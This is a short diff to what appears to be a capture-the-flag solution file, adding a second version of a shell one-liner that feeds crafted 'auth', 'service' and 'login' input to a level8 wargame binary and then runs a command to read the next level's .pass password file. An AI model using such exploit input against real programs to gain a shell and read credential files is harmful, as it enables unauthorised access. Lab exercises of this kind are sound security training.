@@ -1,1 +1,3 @@
 (echo "auth "; echo "servicR0123456789abcdef"; echo "login"; echo $(echo "cat /home/user/level9/.pass")) |./level8
+
+(printf "auth \nservicR0123456789abcdef\nlogin\n"; echo $(echo "cat /home/user/level9/.pass")) | ./level8
